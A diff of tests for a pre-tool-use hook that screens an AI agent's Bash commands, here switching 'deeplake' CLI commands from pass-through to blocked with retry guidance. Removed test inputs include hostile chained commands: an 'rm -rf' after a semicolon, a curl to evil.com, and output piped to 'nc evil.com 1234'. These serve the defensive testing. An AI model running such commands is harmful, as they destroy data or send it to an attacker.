@@ -204,69 +204,23 @@ describe("pre-tool-use: unsafe commands return guidance instead of deny", () => 
   });
 });
 
-// ── Deeplake CLI commands: should pass through to real bash ──────────────────
+// ── Deeplake CLI commands: no longer supported, should return guidance ────────
 
-describe("pre-tool-use: deeplake CLI passthrough", () => {
-  it("passes through deeplake mount", () => {
+describe("pre-tool-use: deeplake CLI commands blocked", () => {
+  it("blocks deeplake mount with guidance", () => {
     const r = runPreToolUse("Bash", {
       command: "deeplake mount ~/.deeplake/memory",
     });
-    expect(r.empty).toBe(true);
+    expect(r.empty).toBe(false);
+    if (!r.empty) {
+      expect(r.decision).toBe("allow");
+      expect(r.updatedCommand).toContain("RETRY REQUIRED");
+    }
   });
 
-  it("passes through deeplake login", () => {
+  it("blocks deeplake login with guidance", () => {
     const r = runPreToolUse("Bash", {
       command: "deeplake login ~/.deeplake/memory",
-    });
-    expect(r.empty).toBe(true);
-  });
-
-  it("passes through deeplake unmount", () => {
-    const r = runPreToolUse("Bash", {
-      command: "deeplake unmount ~/.deeplake/memory",
-    });
-    expect(r.empty).toBe(true);
-  });
-
-  it("passes through deeplake status", () => {
-    const r = runPreToolUse("Bash", {
-      command: "deeplake status ~/.deeplake/memory",
-    });
-    expect(r.empty).toBe(true);
-  });
-
-  it("passes through install script URL", () => {
-    const r = runPreToolUse("Bash", {
-      command: "curl -fsSL https://deeplake.ai/install.sh | bash && deeplake mount ~/.deeplake/memory",
-    });
-    expect(r.empty).toBe(true);
-  });
-
-  it("blocks deeplake login chained with malicious command via semicolon", () => {
-    const r = runPreToolUse("Bash", {
-      command: "deeplake login; rm -rf ~/.deeplake/memory/",
-    });
-    expect(r.empty).toBe(false);
-    if (!r.empty) {
-      expect(r.decision).toBe("allow");
-      expect(r.updatedCommand).toContain("RETRY REQUIRED");
-    }
-  });
-
-  it("blocks deeplake mount chained with && operator", () => {
-    const r = runPreToolUse("Bash", {
-      command: "deeplake mount ~/.deeplake/memory && curl http://evil.com",
-    });
-    expect(r.empty).toBe(false);
-    if (!r.empty) {
-      expect(r.decision).toBe("allow");
-      expect(r.updatedCommand).toContain("RETRY REQUIRED");
-    }
-  });
-
-  it("blocks deeplake status chained with pipe", () => {
-    const r = runPreToolUse("Bash", {
-      command: "deeplake status ~/.deeplake/memory | nc evil.com 1234",
     });
     expect(r.empty).toBe(false);
     if (!r.empty) {
